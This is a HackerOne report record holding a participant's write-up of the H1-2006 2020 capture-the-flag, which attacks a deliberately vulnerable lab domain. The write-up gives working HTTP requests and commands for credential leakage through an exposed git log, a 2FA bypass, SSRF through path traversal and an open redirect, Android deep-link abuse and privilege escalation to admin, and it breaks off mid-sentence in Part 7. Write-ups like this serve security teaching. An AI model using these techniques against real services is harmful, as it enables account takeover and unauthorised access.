{
    "id": 890555,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTA1NTU=",
    "url": "https://hackerone.com/reports/890555",
    "title": "[H1-2006 2020] CTF write-up",
    "state": "Closed",
    "substate": "resolved",
    "severity_rating": "critical",
    "readable_substate": "Resolved",
    "created_at": "2020-06-04T04:28:48.212Z",
    "submitted_at": "2020-06-04T04:28:48.212Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "counterbreach",
        "url": "/counterbreach",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/Vx5BUBb6Aafcet2ejiib45JS/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 46757,
        "url": "https://hackerone.com/h1-ctf",
        "handle": "h1-ctf",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "paused",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": false,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "h1-ctf",
            "twitter_handle": "Hacker0x01",
            "website": "",
            "about": "Let's save the holidays together! #TogetherWeHitHarder"
        }
    },
    "has_bounty?": false,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [],
    "singular_disclosure_disabled": false,
    "disclosed_at": "2020-06-18T15:27:58.044Z",
    "bug_reporter_agreed_on_going_public_at": "2020-06-18T10:29:11.918Z",
    "team_member_agreed_on_going_public_at": "2020-06-18T15:27:57.975Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "Hello,\n\nthank you for the awesome CTF! I definetly learned a lot. For now I will submit just the Flag. I am going to follow up with the Writeup as soon as possible.\n\n^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\n\nKind regards,\nAlex - hackingfish\n\n\nAttached:\n\nA screenshot of the site which is showing the flag\n\n## Impact\n\n.",
    "weakness": {
        "id": 68,
        "name": "Server-Side Request Forgery (SSRF)"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [
        {
            "id": 854548,
            "file_name": "flag.png",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gJY6FXiXABxiNptpv8YFwUBK?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ee80032d93142fc5616717852faea0c23033a8822f4098ed4dcd2e746b2a8a2d",
            "file_size": 19833,
            "type": "image/png"
        }
    ],
    "allow_singular_disclosure_at": "2020-07-18T10:29:11.971Z",
    "allow_singular_disclosure_after": -98225573.15544643,
    "singular_disclosure_allowed": true,
    "vote_count": 4,
    "voters": [
        "nytr0gen",
        "brahim_boufakri01",
        "0nlymohammed",
        "counterbreach"
    ],
    "severity": {
        "rating": "critical",
        "author_type": "User"
    },
    "structured_scope": {
        "databaseId": 48138,
        "asset_type": "WILDCARD",
        "asset_identifier": "*.bountypay.h1ctf.com",
        "max_severity": "none"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 8236726,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugTriaged",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-08T21:03:41.004Z",
            "updated_at": "2020-06-08T21:03:41.004Z",
            "actor": {
                "username": "nahamsec",
                "cleared": true,
                "verified": true,
                "url": "/nahamsec",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8236837,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportTitleUpdated",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-08T21:16:14.699Z",
            "updated_at": "2020-06-08T21:16:14.699Z",
            "additional_data": {
                "old_title": "H1-2006 2020 CTF ",
                "new_title": "[H1-2006 2020] CTF write-up"
            },
            "actor": {
                "username": "nahamsec",
                "cleared": true,
                "verified": true,
                "url": "/nahamsec",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8247941,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "# H1-2006 2020 CTF Writeup\n\nHello and welcome the my writeup for the H1-2006 2020 CTF! It was my first HackerOne CTF and my first submission to a Bug Bounty site over alll! So I hope that I can live up to the standard. ;)\n# Story\nWhen the CTF launched, hackerone made a [tweet](https://twitter.com/Hacker0x01/status/1266454022124376064). The CEO of hackerone, Mårten Mickos lost access to his account and we needed to recover his account and process the payment for May so all the hackers can get paid.\n# Summary\nAfter finding a GIT configuration file which lead me to leaked credentials I was able to bypass the two factor authentication. Furthermore I found a SSRF vulnerability which I was able to chain with a redirect. This allowed me to read data from an internal domain. On this internal domain an APK was being hosted. By completing the challenges presented by the APK, headers for the API were leaked. After more enumeration on the API I gained access to a staff members account. \n\nThrough analyzis of a JS file on the staff domain, I was able to exploit the report functionality of the site, which gave the breached account administrative privileges. This leaked the credentials of the account owned by Mårten Mickos. By logging in with his user and bypassing the hardened 2FA a second time, I was able to pay the hackers. \n\n{F861252}\n# Description\n\n## Part One: Enumeration\n\nThe overall enumeration of the subdomains was straight forward thanks to my tool \"Stalker\". I developed it as my school project and it takes some weight off of my shoulders recon wise. After adding a target, lots of recon scripts get executed and the results are getting displayed in a nice GUI. After scanning the bountypay.h1ctf.com domain I got the following results:\n\n{F861240}\n\nAs you can see there were still a couple of false positives but I got the important ones.\n\n - bountypay.h1ctf.com Main site, has links to app.bountypay.h1ctf.com and staff.bountypay.h1ctf.com\n - api.bountypay.h1ctf.com API of bountypay\n - app.bountypay.h1ctf.com Login for customers of bountypay\n - software.bountypay.h1ctf.com Blocked to outside users, only specific IP's allowed \n - staff.bountypay.h1ctf.com Login for staff members\n\nAfter browsing every site to get a picture of what I am dealing with I usually do directory bruteforcing. By doing this I found a git file on app.bountypay.h1ctf.com/.git/HEAD . Since this seems to be a GIT directory I tried /.git/config shortly after. \n\n## Part Two: Gaining a foothold\nContent of /.git/config:\n\n    [core]\n\t\trepositoryformatversion = 0\n\t\tfilemode = true\n\t\tbare = false\n\t\tlogallrefupdates = true\n\t[remote \"origin\"]\n\t\turl = https://github.com/bounty-pay-code/request-logger.git\n\t\tfetch = +refs/heads/*:refs/remotes/origin/*\n\t[branch \"master\"]\n\t\tremote = origin\n\t\tmerge = refs/heads/master\n\nThis brought me to a git repository. In it was a file called `logger.php` was stored.\n```php\n<?php\n\t$data = array(\n\t'IP' => $_SERVER[\"REMOTE_ADDR\"],\n\t'URI' => $_SERVER[\"REQUEST_URI\"],\n\t'METHOD' => $_SERVER[\"REQUEST_METHOD\"],\n\t'PARAMS' => array(\n\t'GET' => $_GET,\n\t'POST' => $_POST\n\t)\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n    \n   \nWhats important to note here is that after the php script finished a file got created. This lead me to the assumption that this log file might be stored on the server. And it is!\nAfter removing the timestamps and base64 decoding the content of the file I got the following results:\n```json\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\nIn the log file, the login information of the user `brian.oliver` was saved. \n# Part 3: Bypassing 2FA\nAfter logging in with the given credentials, a two factor authentication window appears. \n{F861239}\n#### The expected behaviour\nThe user gets a notification on his mobile phone with a code. The code can consist of characters ranging from A-Z, a-z and 0-9. After supplying the correct token the user gets authenticated by the server and may use the application.\n#### Vulnerability\nWhen submitting a token, the following request gets made:\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 104\nCache-Control: max-age=0\nOrigin: https://app.bountypay.h1ctf.com\nUpgrade-Insecure-Requests: 1\nDNT: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\n\nusername=brian.oliver&password=V7h0inzX&challenge=402a0d5d36f267a8ba25217212938c5c&challenge_answer=A1B2C3D4E5\n```\n`username`: The username the user supplies\n`password`: The password the user supplies\n`challenge`: The md5 hash of the 2FA token the user should supply\n`challenge_answer`: The 2FA token the user supplies. \n\nThe vulnerabilty lies in the`challenge` variable. By letting the attacker decide what the `challenge` should be, he can create his own challenge with his predetermined value. In the example above I chose the challenge `402a0d5d36f267a8ba25217212938c5c`, of which the cleartext value is  `A1B2C3D4E5`. \n#### Impact\nAfter sending the crafted challenge with the corresponding answer the user gets authenticated without having to authenticate with a second factor.\n\nNow that I gained access to the app.bountypay domain, I can try to get access to other sites.\n# Part 4: From App to App\nThe main functionality of app.bountypay.h1ctf.com is to display and make transactions. When requesting payments for a certain month, the following request gets made:\n```\nGET /statements?month=05&year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nAccept: */*\nDNT: 1\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n```\nAnd this is the response:\n```json\n{\n\t\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=05&year=2020\",\n\t\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-05\\\",\\\"transactions\\\":[]}\"\n}\n```\nThe base64 decoded value of the cookie `token`: \n```json\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\nThe request sequence works as follows: A user requests the payments for a certain month and year. Then the server makes a request to to api.bountypay.h1ctf.com with the users `account_id` in the url.\n\nThis looked like it could be exploited with a SSRF (= [Server Side Request Forgery](https://portswigger.net/web-security/ssrf)). But right now I was only able to make requests to a certain API endpoint. This was expected behaviour and not a vulnerability.\n\n#### Recon pays off.\nWhile surfing the endpoints for the first time I noticed a weird url on the front page of api.bountypay.h1ctf.com. \n```html\n<a href=\"/redirect?url=https://www.google.com/search?q=REST+API\">REST API</a>\n```\nI instanly though of an open redirect. When submitting a random url in the paramter the following gets returned:\n\nRequest: `https://api.bountypay.h1ctf.com/redirect?url=https://hackerone.com`\nRespone: `URL NOT FOUND IN WHITELIST`\n\nAfter trying to bypass the wordlist for hours I took a step back and submitted the subdomains of bountypay.h1ctf.com. Low and behold, software.bountypay.h1ctf.com was in the whitelist!\n\nNow the only thing left was to get the API to make a request to software.bountpay.h1ctf.com. Since only specific IP's were allowed I figured this is where I needed to go. \n\n#### Final exploit chain\nBy setting the account_id to `../../` the server made a request to the main site. Now I was at the root of the site and could request any directory of the web server.\n\nBy setting the account_id to `../../redirect?url=software.bountypay.h1ctf.com#` I was able to make the app.bountypay.h1ctf.com server issue a request to software.bounty.pay.h1ctf.com and return the content of the site in json. The `#` was used to remove the parameters which got added by app.bountypay.com before the request was made.\n\nCookie value of `token` (base64 decoded): \n```json\n{\"account_id\":\"..\\/..\\/redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nResponse (shortened):\n```json\n{\n\t\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/#\\/statements?month=01&year=2020\",\n\t\"data\":\"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n    <meta charset=\\\"utf-8\\\">\\n    <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\">\\n ...\"\n}\n```\n\nWhen copying the returned html into a file, I got this page:\n{F861260}\nNothing out of the ordinary. A login bruteforce wouldnt even have been possible because I was only able to send GET requests with the SSRF. Now one of the few things left that I could have tried out was directory bruteforcing.\n\nI did this with bash and Burp Intruder. Bash to parse my wordlist into the cookie and b64 encode it, and Intruder to perform the bruteforce.\n\nThe bash script:\n```bash\n#!/bin/bash\nwhile read p; do\necho \"{\\\"account_id\\\":\\\"..\\/..\\/redirect?url=https://software.bountypay.h1ctf.com\\/$p\\/#\\\",\\\"hash\\\":\\\"de235bffd23df6995ad4e0930baac1a2\\\"}\" | base64 -w 0\nprintf '\\n'\ndone < common.txt \n```\n\n[common.txt](https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt)\n[Output](https://www.hecht1.com/cookie_wordlist.txt)\n\nAfter completing the directory bruteforce the directory `/uploads` popped up. When visiting the directory, it displayed its content, which was an APK file. `BountyPay.apk`\n\n# Part 5: Deeply linked Android\nThis is where I struggled the most. Before doing this CTF I didnt know anything about android hacking. But thankfully I found the [YouTube channel](https://www.youtube.com/channel/UCeSBNDhEqcQSfeR8LEcD-NA) of the creator of the android challenge. He explains the techniques required to solve the challenges there. Twitter recon pays off! (This will also be the case later on)\n\n### PartZeroActivity: Recon\nFor displaying the source code, the manifest, etc I used the [Mobile-Security-Framework: MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF). \nFor actually using the app I created an Ubuntu virtual machine with Android Studio on it. (The Windows version sucks)\n\n### PartOneActivity\n{F861255}\nTwo hints are displayed when clicking the button on the bottom right:\n\n - Deep links.\n - Params.\n\nI could assume that I was dealing with deep links and that I had to append parameters to them.\nA quick look into the java file of the first activity `PartOneActivity.java` confirmed my assumption.\n```java\nif (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter(\"start\")) != null && firstParam.equals(\"PartTwoActivity\") && settings.contains(\"USERNAME\"))\n{\nString user = settings.getString(\"USERNAME\", \"\");\nSharedPreferences.Editor editor = settings.edit();\nString twitterhandle = settings.getString(\"TWITTERHANDLE\", \"\"); editor.putString(\"PARTONE\", \"COMPLETE\").apply();\nlogFlagFound(user, twitterhandle);\nstartActivity(new Intent(this, PartTwoActivity.class));\n}\n```\n\nWhat I took from the If statement: If there is an intent and its first parameter is called `start` and the content of the parameter was `PartTwoActivity` and a username was set, I would get sent to the next challenge.\n#### Exploit\nIn order to exploit the application I used the android debug bride. Short adb. Its a versatile command-line tool that lets me communicate with the android vm. \n\n```bash\nadb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -n bounty.pay/.PartOneActivity -d one://part?start=PartTwoActivity\n```\n\n#### Explanation\n`shell`: Run command on the remote device. In this case the android vm\n`am`: The android activity manager. Used to start the activity\n`-a`: The activity the phone should perform\n`-c`: The category of the activity\n`-n`: The component in which the activity should be executed.  \n`-d`: The deep link the app should process.\n\nI got the scheme and host for the deeplink from the `AndroidManifest.xml` file\nImporant content of `AndroidManifest.xml` for part one:\n```xml\n<activity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\">\n\t<intent-filter android:label=\"\">\n\t\t<action android:name=\"android.intent.action.VIEW\" />\n\t\t<category android:name=\"android.intent.category.DEFAULT\" />\n\t\t<category android:name=\"android.intent.category.BROWSABLE\" />\n\t\t<data android:scheme=\"one\" android:host=\"part\" />\n\t</intent-filter>\n</activity>\n```\n\nWhen executing the command above I got sent to the next challenge.\n\n### PartTwoActivity\n{F861257}\nSeemed to be quite similar to the first challenge on first sight. Hints:\n - `Currently invisible.`\n - `Visible with the right params.`\n\nA quick look into the source code for the second challenge helped again \n```java\nif (getIntent() != null && getIntent().getData() != null){\n\tUri data = getIntent().getData();\n\tString firstParam = data.getQueryParameter(\"two\");\n\tString secondParam = data.getQueryParameter(\"switch\");\n\tif (firstParam != null && firstParam.equals(\"light\") && secondParam != null && secondParam.equals(\"on\")){\n\t\teditText.setVisibility(0);\n\t\tbutton.setVisibility(0);\n\t\ttextview.setVisibility(0);\n\t}\n}\n```\nIf the two parameters `two` and `switch` are present, and their values are `light` and `on` then make things visible.\nThe schema used was again defined in the `AndroidManifest.xml` file.\nFinal command:\n```bash\nadb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -n bounty.pay/.PartTwoActivity -d 'two://part?two=light\\&switch=on'\n```\n\n{F861258}\nNow I had to find out the header value. I managed to do this quickly because I got lucky and guessed the value. `Token` was used before so it wasnt that big of a stretch. I managed to find out beforehand that the header had to start with `X-`. This was readable in the source code of the activity.\n\nHeader value: `X-Token`\n\n### PartThreeActivity\nLike the past two activities, there was an empty page at first.\n\nHints: \n - Reuse some params.\n - Intercept or check for leaks.\n\nAgain, source code is key.\nThe important snippets:\n```java\nString firstParam = data.getQueryParameter(\"three\");\nString secondParam = data.getQueryParameter(\"switch\");\nString thirdParam = data.getQueryParameter(\"header\");\n```\n```java\nbyte[] decodeFirstParam = Base64.decode(firstParam, 0);\nbyte[] decodeSecondParam = Base64.decode(secondParam, 0);\n```\n```java\nif (str != null && decodedFirstParam.equals(\"PartThreeActivity\") && str2 != null && decodedSecondParam.equals(\"on\") && (str = secondParam2) != null) { if (str.equals(\"X-\" + value)) { editText2.setVisibility(0); button2.setVisibility(0); PartThreeActivity.this.thread.start(); } }\n```\nFirst parameter: `three`, Value: B64 value of `PartThreeActivity`\nSecond parameter: `switch`, Value: B64 value of `on`\nThird parameter: `header`, Value: The header we submitted earlier: `X-Token`\n#### Command\n```bash\nadb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -n bounty.pay/.PartThreeActivity -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\&switch=b24=\\&header=X-Token' -S -W\n```\nNote: The & characters have to be escaped with a backslash because bash would interpret them in a wrong way. \n{F861256}\nWhat hash could have leaked? For this I consulted the logcat functionalitly of adb. \nSince X-Token headers are usually associated with hashes I looked for something in that direction.\nCommand: `adb logcat | grep \"X-\"` \n(Important) Output: \n```\n06-07 14:27:13.338  5762  5846 D HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\nWhen submitting the hash this window appeared:\n{F861250}\n# Part 6: Sandras administrative mischief\nAfter more recon I found out that the discovered header `X-Token` worked for the API site. Now I could make regular requests to the API, without having to request them through the app domain and the cookie.\n\nBy directory bruteforcing the `/api` directory I found the endpoint `/api/staff`\nRequest: \n`https://api.bountypay.h1ctf.com/api/staff`\nResponse:\n```json\n[\n\t{\n\t\t\"name\":\"Sam Jenkins\",\n\t\t\"staff_id\":\"STF:84DJKEIP38\"\n\t},\n\t{\n\t\t\"name\":\"Brian Oliver\",\n\t\t\"staff_id\":\"STF:KE624RQ2T9\"\n\t}\n]\n```\nSome staff id's! But I couldnt really do anything with this information. After some more trial and error I discovered interesting functionality. This was the response when I changed the HTTP method to POST.\n```json\n[\n\"Missing Parameter\"\n]\n```\nSo I needed a parameter. What about staff_id? Bingo!\nRequest: \n```\nPOST /api/staff/ HTTP/1.1\nHost: api.bountypay.h1ctf.com\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nAccept: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:84DJKEIP38\n```\nResponse:\n```\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 23:56:36 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\nDamn. Would have been too easy. But remember when I said that the Twitter recon paid off? Well besides the accounts of the CTF creators I also found the account [@BountypayHQ](https://twitter.com/BountypayHQ) which lead me to [@SandraA76708114](https://twitter.com/SandraA76708114). Sandra posted her company badge:\n{F861243}\nWhat happened when I entered her staff_id in the POST request?\n```\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Mon, 08 Jun 2020 00:13:54 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\nAwesome! Now I had access to the staff site. \n### Viewing a profile picture gave me administrative privileges \nThe staff page had 2 major features:\n - Change username & profile picture\n This is being done in the `home` template. By selecting a profile picture, the html class the profile picture belongs to, gets sent in the post request.\t\n - Report site\n By clicking `Report this Page` a b64 encoded string of the directory gets sent to the server. The variable name is `url`. This lead me to the assumption that the content of the url variable gets requested by the server, since I saw similar behaviour before. \n \nThe API call we earlier returned the url it requested in a url variable\n```json\n{\n\t\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/#\\/statements?month=01&year=2020\",\n\t\"data\":\"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n    <meta charset=\\\"utf-8\\\">\\n    <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\">\\n ... \"\n}\n```\n\nBut I had to put this assumption in the back of my mind for now. I had no use for this. Lets look at the profile picture functionality. Like I said, the html class of the profile picture gets submitted when setting a profile picture. What happens if I use another class? \n\n#### Recon pays off. (again)\nWhat I havent mentioned yet is a very suspicious JS file. `website.js`\nThere was also an interesting class being used in this JS file.\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n})\n```\nExplanation: When an HTML element with the class `upgradeToAdmin` is getting clicked, then execute this function. The function made a request to `/admin/upgrade?username=[value of username variable]`\nWhen a normal user makes this request, this is the response:\n`[\"Only admins can perform this\"]`\nThings were slowly coming together. Now when I set the profile picture to `upgradeToAdmin` and clicked on my invisible profile picture, a request to `/admin/upgrade?username=[value of username variable]` gets made.`\nBut a click is required in order to make the request. When the server theoritically made the request to the site I couldnt have told it to click somewhere. \nBut of course there was a way of bypassing this limitation. \n### Tabbing to admin\nThere was another interesting section of code in `website.js`\n\n```javascript\ndocument.location.hash.length > 0 && (\"#tab1\" === document.location.hash && $(\".tab1\").trigger(\"click\"),\n\"#tab2\" === document.location.hash && $(\".tab2\").trigger(\"click\"),\n\"#tab3\" === document.location.hash && $(\".tab3\").trigger(\"click\"),\n\"#tab4\" === document.location.hash && $(\".tab4\").trigger(\"click\"));\n```\n\nWhen adding `#tab[1-4]` the corresponding tab gets selected. Also a `click` event gets executed by javascript. In my POC I added the picture to the `tab3` class. It doesnt matter which tabs is used.\nBut when automatically making the request to upgrade the user to admin the username's value is `undefined`. I had to find a site where the username variable is used so I could set it beforehand. \n\n#### Combining templates\nThis took a long time to figure out, but a google search helped. I was able to combine templates by defining the template variable as an array and using it multiple times.\nRequest: `https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login&username=sandra.allison`\nResponse:\n{F861253}\n\nAnd by adding `&username=sandra.allison` I can fill the username variable in advance.\n### Putting everything together\nWhat I knew: \n - There was an upgradeToAdmin function\n - I could call it automatically by crafting a special url\n - I (thought) I could make requests on behalf of the server as an admin\n\nTesting locally:\nRequest: \n```\nhttps://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab3\n```\nI used the ticket template and not the home template because in the ticket my crafted profile picture is displayed regardless. If I were to tell the server to visit the home template, the profile picture of the server user would be loaded.\nThe page loaded successfully and shortly after the following request was made automatically:\n`GET /admin/upgrade?username=sandra.allison`\n\n#### Final exploit\nReporting the tested site should do the job. \n{F861242}\nAnd voilà! Onto the last part of the challenge with the credentials of marten.mickos.\n\n# Part 7: Stylish 2FA\nThe credentials worked on app.bountypay.h1ctf.com.\nThe original tweet talked about having to process the payments for this month (May). So thats what I checked out 